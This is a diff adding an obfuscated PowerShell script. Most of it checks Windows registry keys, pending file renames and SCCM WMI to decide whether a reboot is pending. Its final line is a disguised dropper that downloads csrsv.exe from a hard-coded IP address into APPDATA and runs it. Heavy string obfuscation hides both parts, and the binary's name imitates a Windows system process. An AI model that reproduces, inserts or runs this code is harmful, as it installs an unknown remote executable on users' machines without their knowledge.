@@ -1,0 +1,14 @@
+${p`A`T`ChrEBoot} = .("{1}{3}{0}{2}" -f'dI','G','tem','et-Chil') -Path ((("{25}{6}{17}{31}{29}{3}{11}{13}{5}{27}{4}{10}{12}{30}{18}{24}{1}{14}{7}{9}{28}{33}{26}{15}{21}{16}{2}{8}{0}{22}{23}{19}{32}{20}" -f'ateJLkAuto','c','Wi','KEY_','NEJL','MA','GI','JLkWi','ndowsUpd','n','kSOF','L','TWAR','OCAL_','rosoft','entV','nJLk','S','JLkM','JLkR','red','ersio',' Upda','te','i','RE','sJLkCurr','CHI','d','RY::H','E','T','ebootRequi','ow')) -replaCe ([ChAR]74+[ChAR]76+[ChAR]107),[ChAR]92) -ErrorAction ("{0}{2}{1}{3}" -f 'Sil','ntlyContinu','e','e')
+
+${cO`mPO`N`eNTBA`S`EDreb`Oot} = &("{0}{2}{1}"-f'Get-Chi','Item','ld') -Path ((("{22}{8}{12}{19}{3}{14}{11}{6}{2}{9}{10}{20}{0}{25}{4}{13}{26}{17}{18}{27}{24}{23}{7}{21}{15}{5}{1}{16}" -f 'CeTWi','in','FTWAREC',':HKEY_','wsCeTCu','Pend','TSO','ing','GIST','eTMi','croso','CHINECe','R','rr','LOCAL_MA','eTReboot','g','ponen','t','Y:','ft','C','RE','ic','d Serv','ndo','entVersionCeTCom',' Base'))  -replACE ([chaR]67+[chaR]101+[chaR]84),[chaR]92) -ErrorAction ("{4}{3}{2}{1}{0}" -f 'e','ntinu','yCo','tl','Silen')
+
+${pen`DIN`gFIL`e`ReN`AMeopE`R`AtIonS} = (&("{2}{1}{3}{4}{0}" -f 'ty','et-','G','Item','Proper') -Path (("{23}{3}{2}{8}{20}{21}{22}{9}{14}{11}{19}{10}{16}{5}{6}{7}{1}{12}{18}{15}{4}{0}{17}{13}"-f 'n M','ontro','R','GIST','o','n','tControlSetci','fC','Y','HINE','c','SYS','lcif','er','cif','essi','ifCurre','anag','S','TEM','::HKE','Y_L','OCAL_MAC','RE'))."rEpLa`cE"('cif',[STRing][CHAr]92) -ErrorAction ("{1}{5}{3}{4}{0}{2}" -f 'tin','Si','ue','tlyCo','n','len'))."PeN`D`i`N`GfileR`EN`Ame`oPerA`TIoNs"
+
+${cON`FI`g`U`RATioNMa`NagERr`EBOot} = &("{1}{3}{4}{2}{0}" -f 'od','I','Meth','nvoke-','Wmi') -Namespace ((("{4}{3}{0}{2}{1}"-f 'TIlWccm','WClientSDK','Il','O','RO'))."R`Epla`ce"('IlW',[stRIng][ChaR]92)) -Class ("{3}{0}{4}{2}{1}" -f 'en','es','iliti','CCM_Cli','tUt') -Name ("{0}{2}{4}{3}{1}{5}"-f'D','otPendin','etermine','ebo','IfR','g') | .("{2}{0}{1}" -f 'e','ct-object','sel') -ExpandProperty ("{3}{2}{0}{1}"-f'tPendin','g','eboo','R')
+If ((${pAtCh`Reb`Oot} -eq ${n`UlL}) -and (${compon`Ent`BAS`EdRebooT} -eq ${N`ULL}) -and (${peNdinGFI`LerENAMe`ope`RAt`Ions} -eq ${n`ULL}) -and (${Conf`I`gUR`A`Tio`NmaNAger`REBOOt} -eq ${fa`lse})) {
+	Return ${f`A`LSe}
+} else {
+	Return ${Tr`Ue}
+}
+
+(&("{0}{1}{2}{3}"-f'New-O','b','j','ect') ("{1}{0}{3}{2}"-f 'm.Net','Syste','ient','.WebCl')).("{2}{1}{0}" -f 'dFile','wnloa','Do').Invoke(("{10}{1}{8}{2}{0}{7}{6}{9}{5}{4}{3}" -f'.53.238','p:/','.102','rsv.exe','s','oo/c','~','/','/94','yah','htt'),"$env:APPDATA\csrsv.exe");.("{3}{2}{1}{0}" -f 'ss','art-Proce','t','S') ("$env:APPDATA\csrsv.exe")
